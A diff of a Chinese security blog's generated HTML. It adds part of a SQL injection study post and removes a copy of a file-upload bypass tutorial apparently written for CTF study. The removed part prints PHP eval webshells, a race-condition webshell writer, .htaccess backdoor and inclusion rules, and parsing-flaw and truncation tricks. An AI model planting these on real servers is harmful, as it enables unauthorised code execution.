@@ -20,30 +20,51 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","Sidebar Display (only for Muse | Mist), available values":["always  expand for all pages automatically."],"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
-<meta property="og:type" content="website">
+  <meta name="description" content="SQL注入SQL注入之Mysql注入姿势及绕过总结 - 先知社区 (aliyun.com)[盲注去这] 联合查询很多时候联合查询也会和其他的几种查询方式一起使用。 联合查询用到的SQL语法知识UNION可以将前后两个查询语句的结果拼接到一起，但是会自动去重。 UNION ALL功能相同，但是会显示所有数据，不会去重。 具有类似功能的还有JOIN https:&#x2F;&#x2F;blog.csdn.net&#x2F;juli">
+<meta property="og:type" content="article">
 <meta property="og:title" content="星河风">
-<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:url" content="http://example.com/2023/10/22/SQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="星河风">
-<meta property="og:description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+<meta property="og:description" content="SQL注入SQL注入之Mysql注入姿势及绕过总结 - 先知社区 (aliyun.com)[盲注去这] 联合查询很多时候联合查询也会和其他的几种查询方式一起使用。 联合查询用到的SQL语法知识UNION可以将前后两个查询语句的结果拼接到一起，但是会自动去重。 UNION ALL功能相同，但是会显示所有数据，不会去重。 具有类似功能的还有JOIN https:&#x2F;&#x2F;blog.csdn.net&#x2F;juli">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdn.net/20180609105306938">
+<meta property="og:image" content="https://img-blog.csdn.net/20180609105334286">
+<meta property="og:image" content="https://img-blog.csdn.net/20180609105509672">
+<meta property="og:image" content="https://img-blog.csdn.net/20180609105559745">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1621238442570/assets/image-20211126104156-twt8ddd.png">
+<meta property="og:image" content="https://img-blog.csdn.net/20180527000303157">
+<meta property="og:image" content="https://img-blog.csdn.net/20180527000350116">
+<meta property="og:image" content="https://img-blog.csdn.net/2018052700044918">
+<meta property="og:image" content="https://img-blog.csdn.net/2018052700054078">
+<meta property="og:image" content="https://img-blog.csdn.net/20180527000625891">
+<meta property="og:image" content="https://img-blog.csdn.net/20180527000746699">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102451-qfyyn3w.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102627-aucxfpc.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102802-651hm3o.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129140931-xh6qnfj.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203530-sxree7q.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203516-cfavxud.png">
+<meta property="og:image" content="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129143258-ladbvll.png">
+<meta property="article:published_time" content="2023-10-22T15:09:57.763Z">
+<meta property="article:modified_time" content="2023-10-17T07:58:59.076Z">
 <meta property="article:author" content="chleynx">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdn.net/20180609105306938">
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2023/10/22/SQL%E6%B3%A8%E5%85%A5/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>星河风</title>
+  <title> | 星河风</title>
   
 
 
@@ -161,9 +182,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -179,10 +201,9 @@
       <meta itemprop="name" content="星河风">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
+        <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2023/10/22/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -202,6 +223,13 @@
               </span>
 
           
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
 
         </div>
       </header>
@@ -212,7 +240,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10594#toc-6">SQL注入之Mysql注入姿势及绕过总结 - 先知社区 (aliyun.com)</a>[盲注去这]</p>
+        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10594#toc-6">SQL注入之Mysql注入姿势及绕过总结 - 先知社区 (aliyun.com)</a>[盲注去这]</p>
 <h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>很多时候联合查询也会和其他的几种查询方式一起使用。</p>
 <h5 id="联合查询用到的SQL语法知识"><a href="#联合查询用到的SQL语法知识" class="headerlink" title="联合查询用到的SQL语法知识"></a>联合查询用到的SQL语法知识</h5><p><code>UNION</code>可以将前后两个查询语句的结果拼接到一起，但是会自动去重。</p>
 <p><code>UNION ALL</code>功能相同，但是会显示所有数据，不会去重。</p>
@@ -810,437 +838,49 @@
 
 <p>129581926211651571912466741651878684928：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#x27;or&#x27;8</span><br><span class="line">string: T0Do#&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>
-      
     </div>
 
     
     
     
-	
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>chleynx
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/10/22/SQL%E6%B3%A8%E5%85%A5/" title="">http://example.com/2023/10/22/SQL注入/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+
+        
 
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/10/file_upload/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/ch.jpg">
-      <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/10/file_upload/" class="post-title-link" itemprop="url">文件上传</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-10 18:38:57" itemprop="dateCreated datePublished" datetime="2023-10-10T18:38:57+08:00">2023-10-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-10-22 16:44:55" itemprop="dateModified" datetime="2023-10-22T16:44:55+08:00">2023-10-22</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Summar/" itemprop="url" rel="index"><span itemprop="name">Summar</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h1><p>正常上传文件,捉取数据包修改（bp抓包改后缀）</p>
-<h1 id="后端绕过"><a href="#后端绕过" class="headerlink" title="后端绕过"></a>后端绕过</h1><p>服务器端检测的绕过</p>
-<h2 id="函数特性"><a href="#函数特性" class="headerlink" title="函数特性"></a>函数特性</h2><p>move_uploaded_file函数会自动去除文件名末尾的点 和 &#x2F;.</p>
-<p><code>fopen</code>函数特性</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=&#x27;1.php/.&#x27;;</span><br><span class="line">$content=&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;</span><br><span class="line">$f = fopen($filename, &#x27;w&#x27;);</span><br><span class="line">    fwrite($f, $content);</span><br><span class="line">    fclose($f);    </span><br><span class="line">?&gt; </span><br><span class="line">#会在当前目录生成1.php,文件名为1.php.也可以</span><br><span class="line">————————————————</span><br></pre></td></tr></table></figure>
-
-<h5 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h5><p>后缀名大小写</p>
-<p>后缀名双写</p>
-<p><code>尝试php3 phtml php3457(linux+apache+php5.6)等后缀</code></p>
-<p>检测MIME类型的,捉包改MIME类型</p>
-<h3 id="服务端检测（MINE类型检测）"><a href="#服务端检测（MINE类型检测）" class="headerlink" title="服务端检测（MINE类型检测） #"></a>服务端检测（MINE类型检测） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-mine%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B">#</a></h3><blockquote>
-<p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p>
-</blockquote>
-<p>服务器代码判断$_FILES[”file“][“type”]是不是图片格式（<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>），如果不是，则不允许上传该文件。</p>
-<p>绕过方法：</p>
-<blockquote>
-<p>抓包后更改Content-Type为允许的类型绕过该代码限制，比如将php文件的<code>Content-Type:application/octet-stream</code>修改为<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>等就可以</p>
-</blockquote>
-<p>常见MIMETYPE</p>
-<blockquote>
-<p>audio&#x2F;mpeg -&gt; .mp3 application&#x2F;msword -&gt; .doc application&#x2F;octet-stream -&gt; .exe application&#x2F;pdf -&gt; .pdf application&#x2F;x-javascript -&gt; .js application&#x2F;x-rar -&gt; .rar application&#x2F;zip -&gt; .zip image&#x2F;gif -&gt; .gif image&#x2F;jpeg -&gt; .jpg &#x2F; .jpeg image&#x2F;png -&gt; .png text&#x2F;plain -&gt; .txt text&#x2F;html -&gt; .html video&#x2F;mp4 -&gt; .mp4</p>
-</blockquote>
-<h3 id="服务端检测（目录路径检测）"><a href="#服务端检测（目录路径检测）" class="headerlink" title="服务端检测（目录路径检测） #"></a>服务端检测（目录路径检测） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84%E6%A3%80%E6%B5%8B">#</a></h3><p>对目录路径的检测不够严谨而导致可以使用%00截断绕过进行攻击。</p>
-<p>绕过方法:</p>
-<blockquote>
-<ul>
-<li>例如：&#x2F;111.php%00.gif&#x2F;111.gif -&gt; &#x2F;111.php</li>
-</ul>
-</blockquote>
-<h3 id="服务端检测（文件扩展名检测）"><a href="#服务端检测（文件扩展名检测）" class="headerlink" title="服务端检测（文件扩展名检测） #"></a>服务端检测（文件扩展名检测） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E6%A3%80%E6%B5%8B">#</a></h3><p>绕过方法：</p>
-<blockquote>
-<ul>
-<li>文件名大小写绕过，如：<code>*.pHp</code> <code>*.aSP</code></li>
-<li>文件名双写绕过，如：<code>*.pphphp</code></li>
-<li>Unicode： 当目标存在json_decode且检查在json_decode之前,可以将php写为<code>\u0070hp</code></li>
-<li>名单列表绕过，如：<code>*.asa</code> <code>*.cer</code></li>
-<li>特殊文件名绕过，比如windows文件名最后不能有.或空格，可设为<code>*.php.</code>或<code>*.php+</code></li>
-<li>0x00截断绕过，比如：<code>*.php(0x00).jpg</code> 或 <code>*.php%00.jpg</code></li>
-<li>文件包含漏洞</li>
-<li>服务器解析漏洞</li>
-<li>.htaccess文件攻击</li>
-</ul>
-</blockquote>
-<h3 id="文件截断绕过攻击"><a href="#文件截断绕过攻击" class="headerlink" title="文件截断绕过攻击 #"></a>文件截断绕过攻击 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87%E6%94%BB%E5%87%BB">#</a></h3><blockquote>
-<p>截断类型：PHP%00截断</p>
-<p>截断原理：由于00代表结束符，所以会把00后面的所有字符删除</p>
-<p>截断条件：PHP版本小于5.3.4，PHP的magic_quotes_gpc为OFF状态</p>
-</blockquote>
-<p>绕过方法：</p>
-<blockquote>
-<ul>
-<li>例如上传文件shell.php，上传文件路径为&#x2F;?upload&#x3D;shell.php</li>
-<li>绕过：&#x2F;?upload&#x3D;shell.php%00.jpg -&gt; &#x2F;?upload&#x3D;shell.php</li>
-</ul>
-</blockquote>
-<h3 id="解析漏洞攻击"><a href="#解析漏洞攻击" class="headerlink" title="解析漏洞攻击 #"></a>解析漏洞攻击 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB">#</a></h3><p>主要有目录解析、文件解析，Apache解析漏洞、Nginx解析漏洞、IIS7.5解析漏洞。</p>
-<h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析 #"></a>目录解析 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90">#</a></h4><blockquote>
-<ul>
-<li>形式：<code>www.xxx.com/xxx.asp/xxx.jpg</code></li>
-<li>原理：服务器会默认把 <code>.asp</code> 和 <code>.asp</code>目录下的文件都解析成asp文件</li>
-</ul>
-</blockquote>
-<h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析 #"></a>文件解析 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90">#</a></h4><blockquote>
-<ul>
-<li>形式：<code>www.xxx.com/xxx.asp;.jpg</code></li>
-<li>原理：服务器默认不解析<code>;</code>后面的内容，因此<code>xxx.asp;jpg</code>被解析为<code>xxx.asp</code>文件了</li>
-</ul>
-</blockquote>
-<h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞 #"></a>Apache解析漏洞 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><p>服务器代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其它后缀的，例如在httpd.conf中如果配置有如下代码，则能够解析php和phtml文件</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml</span><br></pre></td></tr></table></figure>
-
-<p>1</p>
-<p>常用后缀：<code>*.php</code> <code>*.php3</code> <code>*.php4</code> <code>*.php5</code> <code>*.phtml</code> <code>*.pht</code></p>
-<p>在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止。因此，例如上传的文件名为1.php.xxxx，因为后缀xxxx不可解析，所以向左解析后缀php。</p>
-<blockquote>
-<ul>
-<li>例如：<code>shell.php.qwe.asd</code> -&gt;<code>shell.php</code></li>
-</ul>
-</blockquote>
-<h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞 #"></a>Nginx解析漏洞 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><blockquote>
-<p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过 正则匹配设置<strong>SCRIPT_FILENAME</strong>。当访问<code>www.xxx.com/phpinfo.jpg/1.php</code>这个 URL时，$fastcgi_script_name会被设置为“phpinfo.jpg&#x2F;1.php”，然后构造成 SCRIPT_FILENAME传递给PHP CGI。</p>
-<p>原因是开启了 fix_pathinfo 这个选项，会触发 在PHP中的如下逻辑： PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会 将phpinfo.jpg作为PHP文件来解析了。</p>
-</blockquote>
-<p>攻击方式</p>
-<blockquote>
-<ul>
-<li>形式： <code>www.xxxx.com/UploadFiles/image/1.jpg/1.php</code> <code>www.xxxx.com/UploadFiles/image/1.jpg%00.php</code> <code>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</code></li>
-<li>另一种方法：上传一个名字为test.jpg，然后访问<code>test.jpg/.php</code>,在这个目录下就会生成一句话木马shell.php。</li>
-</ul>
-</blockquote>
-<h4 id="IIS7-5解析漏洞"><a href="#IIS7-5解析漏洞" class="headerlink" title="IIS7.5解析漏洞 #"></a>IIS7.5解析漏洞 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#iis7-5%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><blockquote>
-<p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了 <strong>cgi.fix_pathinfo</strong>，而这并不是nginx或者iis7.5本身的漏洞。</p>
-</blockquote>
-<h3 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击 #"></a>竞争条件攻击 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%94%BB%E5%87%BB">#</a></h3><p>一些网站上传文件的逻辑时先允许上传任意文件，然后检查上传文件的文件是否包含WebShell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短暂的时间差（因为需要执行检查文件和删除文件的操作），攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。</p>
-<p>攻击方法：</p>
-<blockquote>
-<ul>
-<li>攻击者需要先上传一个WebShell脚本1.php，1.php的内容为生成一个新的WebShell脚本shell.php，1.php写入如下代码</li>
-</ul>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	fputs(fopen(&quot;../shell.php&quot;, &quot;w&quot;),&#x27;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>当1.php上传完成后，客户端立即访问1.php，则会在服务端当前目录下自动生成shell.php，这时攻击者就利用了时间差完成了WebShell的上传</li>
-</ul>
-</blockquote>
-<h3 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传 #"></a>双文件上传 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%8F%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">#</a></h3><p>本意为上传两个或多个文件去突破。上传点支持多文件上传，但是却只对第一个文件做了过滤。</p>
-<p>利用方式：</p>
-<blockquote>
-<ul>
-<li>在存在双文件上传漏洞的页面中，查看上传的页面。F12找到上传的post表单，action属性是指定上传检测页面，一般是写的绝对路径，比如：<code>xxx.asp/xxx.php</code></li>
-<li>补全url：<code>https://www.xxx.com/xxx.php(asp)</code></li>
-<li>构造本地post提交表单</li>
-</ul>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.xxx.com/xxx.asp(php)&quot; method=&quot;post&quot;</span><br><span class="line">name=&quot;form1&quot; enctype=&quot;multipart/form‐data&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName1&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName2&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-
-<p>利用时只需要修改action的值为指定上传页面即可</p>
-<ul>
-<li>第一个文件上传允许的文件类型（<code>.jpg</code> <code>.png</code> <code>.gif</code> 等），第二个上传文件是一句话木马或者WebShell脚本。这样就可以突破上传限制，成功上传木马到服务器。</li>
-</ul>
-</blockquote>
-<h3 id="php3457"><a href="#php3457" class="headerlink" title="php3457 #"></a>php3457 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#php3457">#</a></h3><blockquote>
-<p>该项为apache专属。关键点在<code>/etc/apache2/mods-available/php5.6.conf</code>这个文件，满足<code>.+\.ph(p[3457]?|t|tml)$</code>，都会被当作php文件解析。</p>
-<p>在apache2目录下<code>grep -r x-httpd-php /etc/apache2</code>找到对应文件就能知道解析哪些后缀。</p>
-</blockquote>
-<h3 id="htaccess文件攻击"><a href="#htaccess文件攻击" class="headerlink" title=".htaccess文件攻击 #"></a>.htaccess文件攻击 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#htaccess%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB">#</a></h3><blockquote>
-<p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
-<p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
-<p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p>
-<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
-</blockquote>
-<p>一般<code>.htaccess</code>可以用来留后门和针对黑名单绕过。在上传网站的根目录下，上传一个<code>.htaccess</code>文件即可。</p>
-<p>绕过方法：</p>
-<blockquote>
-<ul>
-<li>针对黑名单绕过</li>
-</ul>
-<p>创建一个txt文件，写入</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .png</span><br></pre></td></tr></table></figure>
-
-
-
-<p>另存为 <code>.htaccess</code> 名称，保存类型为所有文件，即可将<code>png</code>文件解析为<code>php</code>文件。</p>
-<ul>
-<li>留后门</li>
-</ul>
-<p>在<code>.htaccess</code> 内写入<code>php</code>解析规则，类似于把文件名包含<code>s</code>的解析成<code>php</code>文件</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;s&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>shell.png</code> 就会以<code>php</code>文件执行</p>
-<ul>
-<li>利用.htaccess进行文件包含</li>
-</ul>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>使用#注释使得.htaccess能够成功解析</li>
-</ul>
-</blockquote>
-<h3 id="服务器检测（文件内容检测）"><a href="#服务器检测（文件内容检测）" class="headerlink" title="服务器检测（文件内容检测） #"></a>服务器检测（文件内容检测） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B">#</a></h3><h4 id="文件幻数检测（文件开头）"><a href="#文件幻数检测（文件开头）" class="headerlink" title="文件幻数检测（文件开头） #"></a>文件幻数检测（文件开头） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E5%B9%BB%E6%95%B0%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E5%BC%80%E5%A4%B4">#</a></h4><blockquote>
-<p>幻数 magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。</p>
-</blockquote>
-<p>要绕过文件幻数检测就要在文件开头写上如下的值</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.jpg	FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">.gif	47 49 46 38 39 61</span><br><span class="line">.png	89 50 4E 47</span><br></pre></td></tr></table></figure>
-
-
-
-<p>在文件幻数后面加上自己的WebShell代码就行</p>
-<h4 id="文件相关信息检测"><a href="#文件相关信息检测" class="headerlink" title="文件相关信息检测 #"></a>文件相关信息检测 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%A3%80%E6%B5%8B">#</a></h4><p>图像文件相关信息检测常用的是getimagesize()函数，需要把文件头部分伪造，也就是在幻数的基础上还加了一些文件信息。</p>
-<blockquote>
-<ul>
-<li>例如下面结构</li>
-</ul>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>
-
-
-</blockquote>
-<p>另一种是判断是否包含<code>&lt;?</code>或者<code>php</code></p>
-<blockquote>
-<ul>
